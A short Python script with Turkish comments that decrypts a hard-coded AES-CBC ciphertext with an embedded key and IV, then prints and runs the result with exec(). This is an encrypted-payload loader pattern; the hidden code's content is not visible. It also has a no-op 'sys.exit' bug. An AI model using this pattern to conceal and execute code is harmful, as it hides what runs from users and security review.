from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2
import sys

# Sabit değerler (anahtar ve IV)
iv = b'p2O#\x1c\xb4 \x85\xeez\x17\x90\x97\xc15\xd4'  # IV
key = b'\x90\xa2\xec\xff\x11X\x16\x15\xca\xaf\xda\xee\xd4\xc2d\xa8dC\x02\xa0\xf2AwP\x9e_\xac\x14\xc8\xc3D\xb7' # Key

# Şifreli metin (encrypt.py'den alınacak)
ciphertext = b'\x1d\xf6C\xed\xa8`<\xf4\xe3\x160\x8d\x12\x81\x1aq\xdf\xd1\xaei\xa6\xfe\xccB\xd4Xa\x06\xa7\x85e~'

# AES şifreli objesi oluşturma (CBC)
cipher = AES.new(key, AES.MODE_CBC, iv)

# Şifre çözme
decrypted_text = cipher.decrypt(ciphertext)
try:
    unpadded_text = unpad(decrypted_text, AES.block_size)
    print("Çözülen Metin:", unpadded_text.decode('utf-8'))
    exec(unpadded_text.decode('utf-8')) # Çözülen metni çalıştır
except ValueError as e:
    sys.exit
